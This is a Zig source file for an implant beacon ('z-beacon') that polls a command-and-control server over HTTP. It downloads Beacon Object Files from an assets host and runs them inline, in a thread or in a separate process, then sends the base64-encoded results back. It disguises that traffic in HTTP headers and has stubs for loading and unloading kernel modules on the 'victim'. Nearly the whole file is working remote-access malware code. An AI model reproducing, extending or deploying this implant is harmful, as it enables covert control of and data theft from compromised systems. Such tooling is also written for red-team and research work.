const std = @import("std");
const assert = std.debug.assert;
const bof = @import("bof_launcher_api");
const beacon = @import("bof_api").beacon;

comptime {
    @import("bof_api").includeFunctionCode("memcpy");
    @import("bof_api").includeFunctionCode("memset");
    @import("bof_api").includeStackProbeCode();
}

pub const std_options = std.Options{
    .http_disable_tls = true,
    .log_level = .info,
};
const debug_proxy_enabled = false;
const debug_proxy_host = "127.0.0.1";
const debug_proxy_port = 8080;

// BOF-specific error codes
const BofErrors = enum(u8) {
    OutOfMemory,
    netInitError,
    UnknownError,
};

const PendingBof = struct {
    context: ?*bof.Context = null,
    task_id: []const u8,
    is_persistent: bool = false,
    launcher_error_code: i32 = 0,
};

const BofRes = extern struct {
    status_code: i32 = 0,
    output: ?[*]const u8 = null,
    len: u32 = 0,
    taskID: [*:0]const u8 = undefined,
};

//
// ----------------------------------------------------------------------------
//
// BOF-specific error codes
const netConnectionType = enum(u8) {
    Heartbeat,
    ResourceFetch,
    TaskResult,
};

fn netInit(allocator: *anyopaque) callconv(.C) *anyopaque {
    const alloc: *std.mem.Allocator = @ptrCast(@alignCast(allocator));

    return netHttpInit(alloc.*) catch unreachable;
}

fn netHttpInit(allocator: std.mem.Allocator) !*std.http.Client {
    // create proxy if set so
    const http_proxy = if (debug_proxy_enabled) blk: {
        const proxy = try allocator.create(std.http.Client.Proxy);
        proxy.* = .{
            .protocol = .plain,
            .authorization = null,
            .host = debug_proxy_host,
            .port = debug_proxy_port,
            .supports_connect = true,
        };
        break :blk proxy;
    } else null;

    // create and return http_client
    const http_client = try allocator.create(std.http.Client);
    http_client.* = .{
        .allocator = allocator,
        .http_proxy = http_proxy,
    };

    return @ptrCast(http_client);
}

fn netConnect(state: *anyopaque, connectionType: netConnectionType, extra_data: ?*anyopaque) callconv(.C) ?*anyopaque {
    const s: *State = @ptrCast(@alignCast(state));

    const res = netHttpConnect(s, connectionType, extra_data) catch |err| switch (err) {
        error.OutOfMemory => return null,
        else => return null,
    };

    return @ptrCast(res);
}

fn netHttpConnect(s: *State, connectionType: netConnectionType, extra_data: ?*anyopaque) !*std.http.Client.Connection {
    const http_client: *std.http.Client = @ptrCast(@alignCast(s.net_client));

    var address: []const u8 = undefined;
    var host: []const u8 = undefined;
    var port: u16 = undefined;
    const proto: std.http.Client.Connection.Protocol = .plain;

    _ = extra_data;

    if (connectionType == netConnectionType.Heartbeat) {
        address = s.c2_host;
    } else if (connectionType == netConnectionType.ResourceFetch) {
        address = s.assets_host;
    } else if (connectionType == netConnectionType.TaskResult) {
        address = s.c2_host;
    }

    var iter = std.mem.splitScalar(u8, address, ':');
    const h = iter.next() orelse return error.BadData;
    host = try s.allocator.dupe(u8, h);
    port = try std.fmt.parseInt(u16, iter.next() orelse return error.BadData, 10);

    const conn = try http_client.connect(host, port, proto);
    conn.closing = true;
    if (http_client.http_proxy != null)
        conn.proxied = true;

    return conn;
}

fn netDisconnect(state: *anyopaque, net_connection: *anyopaque) callconv(.C) void {
    //const s: *State = @ptrCast(@alignCast(state));
    //const conn: *std.http.Client.Connection = @ptrCast(@alignCast(net_connection));
    //
    _ = net_connection;
    _ = state;

    std.log.info("in netDisconnect", .{});

    //conn.close(s.allocator);
}

fn netExchange(state: *anyopaque, connectionType: netConnectionType, net_connection: *anyopaque, len: *u32, extra_data: ?*anyopaque) callconv(.C) ?*anyopaque {
    const s: *State = @ptrCast(@alignCast(state));
    const conn: *std.http.Client.Connection = @ptrCast(@alignCast(net_connection));

    const res = netHttpExchange(s, connectionType, conn, len, extra_data) catch |err| switch (err) {
        error.OutOfMemory => return null,
        else => return null,
    };

    if (res != null) {
        return @ptrCast(res.?.ptr);
    } else return null;
}

fn netHttpExchange(s: *State, connectionType: netConnectionType, conn: *std.http.Client.Connection, len: *u32, extra_data: ?*anyopaque) !?[]u8 {
    const http_client: *std.http.Client = @ptrCast(@alignCast(s.net_client));

    var http_method: std.http.Method = undefined;
    var uri: std.Uri = undefined;
    var body_data: ?[]u8 = null;
    var bof_res: ?*BofRes = null;
    var masked_body_len: u32 = 0;

    //prepare request options
    const server_header_buffer = s.allocator.alloc(u8, 16 * 1024) catch return null;
    defer s.allocator.free(server_header_buffer);

    const http_reqOptions = s.allocator.create(std.http.Client.RequestOptions) catch return null;
    http_reqOptions.* = .{
        .server_header_buffer = server_header_buffer,
        .keep_alive = true,
    };
    defer s.allocator.destroy(http_reqOptions);

    if (connectionType == netConnectionType.Heartbeat) {
        http_method = std.http.Method.GET;
        const url = std.fmt.allocPrintZ(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint }) catch return null;
        //defer s.allocator.free(url);
        uri = std.Uri.parse(std.mem.sliceTo(url, 0)) catch return null;

        // apply HTTP header transforms
        _ = s.implant_actions.netMasquerade(s, connectionType, http_reqOptions, null, len);
    } else if (connectionType == netConnectionType.ResourceFetch and extra_data != null) {
        // in case of ResourceFetch exchange extra_data is a  0-terminated path to the resource
        const bof_path: []const u8 = std.mem.sliceTo(@as([*:0]const u8, @ptrCast(extra_data)), 0);

        std.log.info("in netExchange: ResurceFetch {s}", .{bof_path});

        http_method = std.http.Method.GET;
        const url = std.fmt.allocPrintZ(s.allocator, "http://{s}{s}", .{ s.assets_host, bof_path }) catch unreachable;
        //defer s.allocator.free(url);
        uri = std.Uri.parse(std.mem.sliceTo(url, 0)) catch return null;

        // apply HTTP header transforms
        _ = s.implant_actions.netMasquerade(s, connectionType, http_reqOptions, null, len);
    } else if (connectionType == netConnectionType.TaskResult and extra_data != null) {
        // in case of TaskResult exchange extra_data is a length len.*

        bof_res = @as(*BofRes, @ptrCast(@alignCast(extra_data)));

        http_method = std.http.Method.POST;
        const url = std.fmt.allocPrintZ(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint }) catch return null;
        //defer s.allocator.free(url);
        uri = std.Uri.parse(std.mem.sliceTo(url, 0)) catch return null;

        // apply HTTP header transforms and
        // mask body data according to transforms implemented in netMasquerade(...) and assign it to 'body_data' which will be sent
        masked_body_len = 0;
        const masked_body: ?[*]u8 = @ptrCast(s.implant_actions.netMasquerade(s, connectionType, http_reqOptions, bof_res, &masked_body_len));
        if (masked_body) |body| {
            body_data = @as([*]u8, @ptrCast(@constCast(body)))[0..masked_body_len];
        }
    }

    // create HTTP request
    var server_header: std.heap.FixedBufferAllocator = .init(server_header_buffer);
    const http_request = s.allocator.create(std.http.Client.Request) catch return null;
    http_request.* = .{
        .uri = uri,
        .client = http_client,
        .connection = conn,
        .keep_alive = http_reqOptions.keep_alive,
        .method = http_method,
        .version = http_reqOptions.version,
        .transfer_encoding = .none,
        .redirect_behavior = http_reqOptions.redirect_behavior,
        .handle_continue = http_reqOptions.handle_continue,
        .response = .{
            .version = undefined,
            .status = undefined,
            .reason = undefined,
            .keep_alive = undefined,
            .parser = .init(server_header.buffer[server_header.end_index..]),
        },
        .headers = http_reqOptions.headers,
        .extra_headers = http_reqOptions.extra_headers,
        .privileged_headers = http_reqOptions.privileged_headers,
    };
    defer s.allocator.destroy(http_request);

    if (connectionType == netConnectionType.TaskResult and body_data != null)
        http_request.transfer_encoding = .{ .content_length = masked_body_len };

    // sends HTTP header
    http_request.send() catch unreachable;

    // sends HTTP body
    if (connectionType == netConnectionType.TaskResult and body_data != null) {
        http_request.transfer_encoding = .{ .content_length = body_data.?.len };
        http_request.writeAll(body_data.?) catch unreachable;
        http_request.finish() catch unreachable;
    }

    // get the for response
    // TODO make sure that HTTP 200 was returned
    http_request.wait() catch return null;
    //if (http_request.response.status != .ok) {
    //    return error.BadData;
    //}

    const body_resp_content = s.allocator.alloc(u8, @intCast(http_request.response.content_length.?)) catch return null;
    errdefer s.allocator.free(body_resp_content);

    _ = http_request.readAll(body_resp_content) catch return null;
    len.* = @intCast(body_resp_content.len);

    // TODO: free in case of error
    http_request.deinit();

    if (connectionType != netConnectionType.TaskResult) {
        return body_resp_content;
    } else return null;
}

fn netMasquerade(state: *anyopaque, connectionType: netConnectionType, hdr_to_mask: *anyopaque, data_to_mask: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque {
    const s: *State = @ptrCast(@alignCast(state));
    const http_reqOptions: *std.http.Client.RequestOptions = @ptrCast(@alignCast(hdr_to_mask));

    const res = netHttpMasquerade(s, connectionType, http_reqOptions, data_to_mask, len) catch |err| switch (err) {
        error.OutOfMemory => return null,
        else => return null,
    };

    if (res != null) {
        return @ptrCast(res.?.ptr);
    } else return null;
}

fn netHttpMasquerade(s: *State, connectionType: netConnectionType, http_reqOptions: *std.http.Client.RequestOptions, data_to_mask: ?*anyopaque, len: *u32) !?[]u8 {

    //
    // Implement transforms based on type of the current connection
    //
    if (connectionType == netConnectionType.Heartbeat) {

        // header transforms: implantID -> HTTP authorization header
        http_reqOptions.headers.authorization = std.http.Client.Request.Headers.Value{
            .override = s.implant_identity,
        };
    } else if (connectionType == netConnectionType.ResourceFetch) {

        // header transforms: implantID -> HTTP authorization header
        http_reqOptions.headers.authorization = std.http.Client.Request.Headers.Value{
            .override = s.implant_identity,
        };
    } else if (connectionType == netConnectionType.TaskResult) {

        // sth is wrong: nothing to mask
        const bof_res: ?*BofRes = @ptrCast(@alignCast(data_to_mask));
        if (bof_res == null) return null;

        // header transforms: taskID -> HTTP authorization header
        const taskID = std.mem.sliceTo(bof_res.?.taskID, 0);
        http_reqOptions.headers.authorization = std.http.Client.Request.Headers.Value{
            .override = taskID,
        };

        // header transforms: string(result:{d}) -> HTTP user_agent header
        http_reqOptions.headers.user_agent = std.http.Client.Request.Headers.Value{ .override = try std.fmt.allocPrintZ(s.allocator, "result:{d}", .{bof_res.?.status_code}) };

        // header transforms: content_type -> "text/html"
        http_reqOptions.headers.content_type = std.http.Client.Request.Headers.Value{
            .override = "text/html",
        };

        // data / body transforms: base64(body)
        if (bof_res.?.output != null) {
            const new_body_len = s.base64_encoder.calcSize(bof_res.?.len);
            const out_b64 = try s.allocator.alloc(u8, new_body_len);
            errdefer s.allocator.free(out_b64);

            const body = @as([*]u8, @ptrCast(@constCast(bof_res.?.output)))[0..bof_res.?.len];
            _ = s.base64_encoder.encode(out_b64, body);

            std.log.info("Bof launcher output (base64): {s}", .{out_b64});

            // update len and return pointer to new buffer
            len.* = @intCast(new_body_len);
            return out_b64;
        }
    }

    return null;
}

fn netUnmasquerade(state: *anyopaque, connectionType: netConnectionType, pkt_data: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque {
    const s: *State = @ptrCast(@alignCast(state));

    const res = netHttpUnmasquerade(s, connectionType, pkt_data, len) catch |err| switch (err) {
        error.OutOfMemory => return null,
        else => return null,
    };

    if (res != null) {
        return @ptrCast(res.?.ptr);
    } else return null;
}

fn netHttpUnmasquerade(s: *State, connectionType: netConnectionType, pkt_data: ?*anyopaque, len: *u32) !?[]u8 {
    _ = connectionType;
    _ = s;

    //TODO: else if based on connection type
    if (pkt_data != null) {
        const body = @as([*]u8, @ptrCast(@constCast(pkt_data.?)))[0..len.*];
        // TODO: performs all needed transforms
        len.* = @intCast(body.len);
        return body;
    }

    return null;
}

//
// ----------------------------------------------------------------------------
//

const State = struct {
    const Self = @This();

    allocator: std.mem.Allocator,
    net_client: *anyopaque = undefined,

    implant_identity: []u8,
    implant_actions: ImplantActions,

    jitter: u32,

    c2_host: [:0]const u8,
    c2_endpoint: [:0]const u8,
    assets_host: [:0]const u8,

    pending_bofs: std.ArrayList(PendingBof),
    persistent_bofs: std.AutoHashMap(u64, bof.Object),

    base64_decoder: std.base64.Base64Decoder,
    base64_encoder: std.base64.Base64Encoder,

    fn getImplantIdentity(allocator: std.mem.Allocator) ![]u8 {
        const arch_name = @tagName(@import("builtin").cpu.arch);
        const os_release = @tagName(@import("builtin").os.tag);

        // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
        const implant_id = try std.mem.join(allocator, "", &.{
            arch_name,
            ":",
            os_release,
        });

        return implant_id;
    }

    fn init(allocator: std.mem.Allocator) !State {
        const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
        const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');

        const implant_identity = try getImplantIdentity(allocator);

        const implant_actions: ImplantActions = .{
            .netInit = netInit,
            .netConnect = netConnect,
            .netDisconnect = netDisconnect,
            .netExchange = netExchange,
            .netUnmasquerade = netUnmasquerade,
            .netMasquerade = netMasquerade,
        };

        const net_client = implant_actions.netInit(@constCast(@ptrCast(&allocator)));

        //TODO: move it to ImplanActions.netMasquarede(...) function
        const implant_identity_b64 = try allocator.alloc(u8, base64_encoder.calcSize(implant_identity.len));
        _ = std.base64.Base64Encoder.encode(&base64_encoder, implant_identity_b64, implant_identity);

        return State{
            .allocator = allocator,
            .net_client = net_client,

            .implant_identity = implant_identity_b64,
            .implant_actions = implant_actions,

            .jitter = 3,

            .c2_host = try std.fmt.allocPrintZ(allocator, "127.0.0.1:8000", .{}),
            .c2_endpoint = try std.fmt.allocPrintZ(allocator, "/endpoint", .{}),
            .assets_host = try std.fmt.allocPrintZ(allocator, "127.0.0.1:8000", .{}),

            .base64_decoder = base64_decoder,
            .base64_encoder = base64_encoder,

            .pending_bofs = std.ArrayList(PendingBof).init(allocator),
            .persistent_bofs = std.AutoHashMap(u64, bof.Object).init(allocator),
        };
    }

    fn deinit(state: *State, allocator: std.mem.Allocator) void {
        allocator.free(state.implant_identity);

        allocator.free(state.c2_host);
        allocator.free(state.c2_endpoint);
        allocator.free(state.assets_host);

        state.pending_bofs.deinit();
        state.persistent_bofs.deinit();
        state.* = undefined;
    }
};

const ImplantActions = struct {
    const Self = @This();

    netInit: *const fn (state: *anyopaque) callconv(.C) *anyopaque = undefined,

    netConnect: *const fn (state: *anyopaque, connectionType: netConnectionType, data: ?*anyopaque) callconv(.C) ?*anyopaque = undefined,
    netDisconnect: *const fn (state: *anyopaque, conn: *anyopaque) callconv(.C) void = undefined,

    netExchange: *const fn (state: *anyopaque, connectionType: netConnectionType, net_connection: *anyopaque, len: *u32, extra_data: ?*anyopaque) callconv(.C) ?*anyopaque = undefined,

    netUnmasquerade: *const fn (state: *anyopaque, connectionType: netConnectionType, data: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque = undefined,
    netMasquerade: *const fn (state: *anyopaque, connectionType: netConnectionType, hdr_to_mask: *anyopaque, data_to_mask: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque = undefined,

    kmodLoad: ?*const fn (module_image: [*]const u8, len: usize, param_values: [*:0]const u8) callconv(.C) c_int = null,
    kmodRemove: ?*const fn (mod_name: [*:0]const u8, flags: u32) callconv(.C) c_int = null,

    pub fn attachFunctionality(self: *Self, bofObj: bof.Object) void {
        const fields = @typeInfo(Self).@"struct".fields;

        var ptr_table: [fields.len]usize = undefined;

        inline for (fields, 0..) |_, i| {
            ptr_table[i] = @intFromPtr(self) + i * @sizeOf(usize);
        }

        inline for (fields, 0..) |field, i| {
            @as(*usize, @ptrFromInt(ptr_table[i])).* = @intFromPtr(bofObj.getProcAddress(field.name));
        }
    }
};

fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, task_fields: [][]const u8) !void {
    const bof_task_id = task_fields[0];
    //const bof_name = task_fields[1];
    const bof_path = task_fields[2];
    const bof_header = task_fields[3];
    const bof_argv_b64 = task_fields[4];

    std.log.info("bof_argv_b64: {s}", .{bof_argv_b64});

    const len = try state.base64_decoder.calcSizeForSlice(bof_argv_b64);
    const bof_argv = try allocator.alloc(u8, len);
    defer allocator.free(bof_argv);
    _ = try state.base64_decoder.decode(bof_argv, bof_argv_b64);

    // process BOF header { exec_mode:args_spec{iszZb}:bofHash:[persist] }
    var bof_header_iter = std.mem.splitScalar(u8, bof_header, ':');

    // get hint regarding execution mode
    const exec_mode = bof_header_iter.next() orelse return error.BadData;

    // get arguments specification string
    //const args_spec = bof_header_iter.next() orelse return error.BadData;
    _ = bof_header_iter.next() orelse return error.BadData;

    // get BOF's hash
    const hash = try std.fmt.parseInt(u64, bof_header_iter.next() orelse return error.BadData, 16);
    std.log.info("Received hash: 0x{x}", .{hash});

    // keep BOF in memory after running it?
    const is_persistent = if (bof_header_iter.next()) |v| std.mem.eql(u8, v, "persist") else false;

    var is_loaded: bool = false;
    var bof_to_exec: bof.Object = undefined;
    // BOF was already loaded persistently and is available
    if (state.persistent_bofs.get(hash)) |b| {
        std.log.info("Re-using existing persistent BOF (hash: 0x{x})", .{hash});
        bof_to_exec = b;
        is_loaded = true;

        // else: we need to fetch BOF file content from C2 sever
    } else {
        std.log.info("fetching BOF", .{});
        const net_conn = state.implant_actions.netConnect(state, netConnectionType.ResourceFetch, null);

        if (net_conn) |conn| {
            var body_len: u32 = 0;
            const masked_bof_content: ?[*]u8 = @ptrCast(state.implant_actions.netExchange(state, netConnectionType.ResourceFetch, conn, &body_len, @constCast(@ptrCast(bof_path.ptr))));
            std.log.info("after BOF fetch (BOF size: {d}", .{body_len});

            var new_body_len = body_len;
            const bof_content: ?[*]u8 = @ptrCast(state.implant_actions.netUnmasquerade(state, netConnectionType.ResourceFetch, @constCast(@ptrCast(masked_bof_content)), &new_body_len));

            if (bof_content) |b| {
                bof_to_exec = try bof.Object.initFromMemory(b[0..new_body_len]);
                errdefer bof_to_exec.release();

                if (is_persistent) {
                    try state.persistent_bofs.put(hash, bof_to_exec);
                    std.log.info("Loaded new persistent BOF (hash: 0x{x})", .{hash});
                }
            }
            state.implant_actions.netDisconnect(state, conn);
        }
    }

    var bof_context: ?*bof.Context = null;
    errdefer if (bof_context) |context| context.release();

    const bof_args = try bof.Args.init();
    defer bof_args.release();

    if (!std.mem.eql(u8, bof_argv, "")) {
        std.log.info("bof_argv: {s}", .{bof_argv});

        var iter = std.mem.tokenizeScalar(u8, bof_argv, ' ');
        var i: u32 = 0;

        // build 'bof_args' by parsing 'argv' and inspecting args_spec:
        // possible values for args_spec: iszZb
        bof_args.begin();
        while (iter.next()) |arg| {
            std.log.info("Adding arg: {s}", .{arg});

            //if (args_spec[i] == 'b') {
            //    const buf = if (root.object.get(arg)) |value| buf: {
            //        const len = try state.base64_decoder.calcSizeForSlice(value.string);
            //        const buf = try allocator.alloc(u8, len);
            //        errdefer allocator.free(buf);
            //        _ = try state.base64_decoder.decode(buf, value.string);
            //        break :buf buf;
            //    } else null;
            //    defer if (buf) |b| allocator.free(b);

            //    std.log.info("buf: {s} {s}", .{ arg, buf.? });

            //    const trimmed_buf = std.mem.trimRight(u8, buf.?, "\n");

            //    const buf_len = try std.fmt.allocPrint(allocator, "i:{d}", .{trimmed_buf.len});
            //    defer allocator.free(buf_len);

            //    try bof_args.add(buf_len);
            //    try bof_args.add(std.mem.asBytes(&trimmed_buf.ptr));
            //} else {
            try bof_args.add(arg);
            //}

            i += 1;
        }
        bof_args.end();
    }

    if (std.mem.eql(u8, exec_mode, "inline")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_to_exec.run(bof_args.getBuffer());
    } else if (std.mem.eql(u8, exec_mode, "thread")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_to_exec.runAsyncThread(
            bof_args.getBuffer(),
            null,
            null,
        );
    } else if (std.mem.eql(u8, exec_mode, "process")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_to_exec.runAsyncProcess(
            bof_args.getBuffer(),
            null,
            null,
        );
    }
    // callback is a special mode of operation that behaves as follows:
    // 1. check if given BOF has go(...) function if so -> 2; else -> 3
    // 2. execute go() as inline BOF (this implies creating bof.Context object)
    // 3. call global_func_table.getPointers(bof) to provide BOF-stager's with implementation
    // BOF isn't executed (i.e. bof.Context isn't created). It provides one or more
    // function implementations for global_func_table. BOF is implicitly added to state.persistent_bofs.
    else if (std.mem.eql(u8, exec_mode, "callback")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        state.implant_actions.attachFunctionality(bof_to_exec);

        try state.persistent_bofs.put(hash, bof_to_exec);

        // BOF contains go(...) function, so execute it
        if (bof_to_exec.getProcAddress("go") != null) {
            bof_context = try bof_to_exec.run(bof_args.getBuffer());
        } else {
            // return here, as we do not create bof.Context so we don't want to append it to state.pending_bofs list
            return;
        }
    }

    if (bof_context) |context| {
        try state.pending_bofs.append(.{
            .context = context,
            .task_id = try allocator.dupe(u8, bof_task_id),
            .is_persistent = is_persistent,
        });
    } else return error.FailedToRunBof;
}

fn processCommands(allocator: std.mem.Allocator, state: *State, resp_content: []u8) !void {
    var task_fields = std.ArrayList([]const u8).init(allocator);
    defer task_fields.deinit();

    // handle task from C2, valid task's format:
    // taskID,cmdName{type:name},[URI],[bofHeader{execMode,argTypes,bofHash,[persist]}],[base64(argv)]
    var iter_task = std.mem.splitScalar(u8, resp_content, ',');

    const task_id = iter_task.next() orelse return error.BadData;
    try task_fields.append(task_id);

    const task_name = iter_task.next() orelse return error.BadData;
    try task_fields.append(task_name);

    // for uri: make sure that it is \0 ended
    const uri = iter_task.next();
    var uri_final: []const u8 = undefined;
    if (uri) |u| {
        uri_final = try std.mem.joinZ(allocator, "", &.{u});
    } else {
        uri_final = try std.mem.joinZ(allocator, "", &.{""});
    }
    try task_fields.append(uri_final);
    defer allocator.free(uri_final);

    const bofHeader = iter_task.next();
    if (bofHeader) |h| try task_fields.append(h) else try task_fields.append("");

    const argv = iter_task.next();
    if (argv) |a| try task_fields.append(a) else try task_fields.append("");

    if (task_fields.items.len != 5)
        return error.BadData;

    iter_task.reset();
    std.log.info("Following task received:]\n", .{});
    std.log.info("-------------------------------------------------------------\n", .{});
    std.log.info("taskID: {s}", .{iter_task.next() orelse return error.BadData});
    std.log.info("Command name: {s}", .{iter_task.next() orelse return error.BadData});
    std.log.info("URI: {s}", .{iter_task.next() orelse return error.BadData});
    std.log.info("bofHeader: {s}", .{iter_task.next() orelse return error.BadData});
    std.log.info("argv: {s}", .{iter_task.next() orelse return error.BadData});
    std.log.info("-------------------------------------------------------------\n", .{});

    // check type of task to execute:
    // bof - fetch and execute bof
    // cmd - execute builtin command (like: sleep <sec>; release_persistent_bofs, etc.)
    // kmod - fetch and load kernel module
    // TODO: fs - execute chosen executable from victim's filesystem
    var iter_command = std.mem.splitScalar(u8, task_name, ':');
    const cmd_prefix = iter_command.next() orelse return error.BadData;
    const cmd_name = iter_command.next() orelse return error.BadData;

    // tasked for BOF execution?
    if (std.mem.eql(u8, cmd_prefix, "bof")) {
        std.log.info("Executing bof: {s}", .{cmd_name});

        if (uri == null or bofHeader == null)
            return error.BadData;

        if (std.mem.eql(u8, uri.?, "") or std.mem.eql(u8, bofHeader.?, ""))
            return error.BadData;

        receiveAndLaunchBof(allocator, state, task_fields.items.ptr[0..task_fields.items.len]) catch |err| {
            try state.pending_bofs.append(.{
                .task_id = try allocator.dupe(u8, task_id),
                // TODO: Error codes may change in Zig, this is hacky.
                .launcher_error_code = @abs(@intFromError(err)) - 1000,
            });
        };
        // tasked for kernel module loading?
    } else if (std.mem.eql(u8, cmd_prefix, "kmod")) {
        if (state.implant_actions.kmodLoad == null) {
            std.log.info("Kernel module loading not implemented", .{});
            return error.BadData;
        }

        //const kmod_path = root.object.get("path").?.string;
        //const kmod_content = try fetchBlob(allocator, state, kmod_path);
        //defer allocator.free(kmod_content);

        //std.log.info("Loading kernel module: {s}", .{cmd_name});
        //_ = state.implant_actions.kmodLoad.?(kmod_content.ptr, kmod_content.len, "paaarams");
        // tasked for kernel module unloading?
    } else if (std.mem.eql(u8, cmd_prefix, "kmodrm")) {
        if (state.implant_actions.kmodRemove == null) {
            std.log.info("Kernel module unloading not implemented", .{});
            return error.BadData;
        }

        std.log.info("Removing kernel module: {s}", .{cmd_name});
        _ = state.implant_actions.kmodRemove.?(@ptrCast(cmd_name.ptr), 0);

        // tasked for custom command execution?
    } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
        std.log.info("Executing builtin command: {s}", .{cmd_name});

        // tasked to execute cmd:release_persistent_bofs
        if (std.mem.eql(u8, cmd_name, "release_persistent_bofs")) {
            var it = state.persistent_bofs.valueIterator();
            while (it.next()) |v| {
                const bof_object = v.*;
                bof_object.release();
            }
            state.persistent_bofs.clearAndFree();
        }
    }
}

fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
    var pending_bof_index: usize = 0;
    while (pending_bof_index != state.pending_bofs.items.len) {
        const pending_bof = state.pending_bofs.items[pending_bof_index];

        //
        // BOF is still running
        //

        if (pending_bof.context != null and pending_bof.context.?.isRunning()) {
            pending_bof_index += 1;
            continue;
        }

        //
        // BOF run is completed so check its status code and output
        //

        var bof_res = BofRes{
            .status_code = undefined,
            .output = null,
            .len = 0,
            .taskID = undefined,
        };

        // checking status code
        bof_res.status_code = if (pending_bof.context) |context|
            @intCast(context.getExitCode())
        else
            pending_bof.launcher_error_code;

        // getting task id
        const tempSlice = try allocator.dupeZ(u8, pending_bof.task_id);
        bof_res.taskID = tempSlice.ptr;

        // checking output
        if (pending_bof.context) |context| {
            if (context.getOutput()) |boftput| {
                const temp = try allocator.dupe(u8, boftput);

                bof_res.output = temp.ptr;
                bof_res.len = @intCast(boftput.len);
            }

            if (!pending_bof.is_persistent)
                context.getObject().release();

            context.release();
        }

        //
        // Sending results (status code & output) to C2 server
        //
        std.log.info("BOF status code: {d}", .{bof_res.status_code});
        if (bof_res.len > 0) {
            //std.log.info("BOF output len: {d}", .{bof_res.len});
            std.log.info("Bof launcher output: {s}", .{bof_res.output.?[0..bof_res.len]});
        }

        // establishing connection
        const net_conn = state.implant_actions.netConnect(state, netConnectionType.TaskResult, null);

        if (net_conn) |conn| {
            var body_len: u32 = bof_res.len;
            _ = state.implant_actions.netExchange(state, netConnectionType.TaskResult, conn, &body_len, @constCast(@ptrCast(&bof_res)));

            state.implant_actions.netDisconnect(state, conn);
        }

        allocator.free(pending_bof.task_id);
        _ = state.pending_bofs.swapRemove(pending_bof_index);
    }
}

pub export fn go(_: ?[*]u8, _: i32) callconv(.C) u8 {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var state = State.init(allocator) catch unreachable;
    defer state.deinit(allocator);

    std.log.info("z-beacon launched", .{});

    while (true) {
        // connect to C2 server
        const net_conn = state.implant_actions.netConnect(&state, netConnectionType.Heartbeat, null);

        if (net_conn) |conn| {
            var body_len: u32 = 0;
            const resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netExchange(&state, netConnectionType.Heartbeat, conn, &body_len, null));

            // unmask received data and process command (if any)
            if (body_len > 0) {
                //const unmasked_resp_content: ?[*]u8 = @ptrCast(state.implant_actions.netUnmasquerade(&state, req_raw, resp_content, &body_len));

                //if (unmasked_resp_content) |buf| {
                if (resp_content) |buf| {
                    std.log.info("Before processCommands", .{});
                    processCommands(allocator, &state, buf[0..body_len]) catch {};
                    std.log.info("After processCommands", .{});
                }
            }

            // disconnect from C2 server
            state.implant_actions.netDisconnect(&state, conn);
            std.log.info("After netDisconnect", .{});
        }

        // process queued BOFs
        processPendingBofs(allocator, &state) catch {};

        std.time.sleep(state.jitter * @as(u64, 1e9));
    }
}
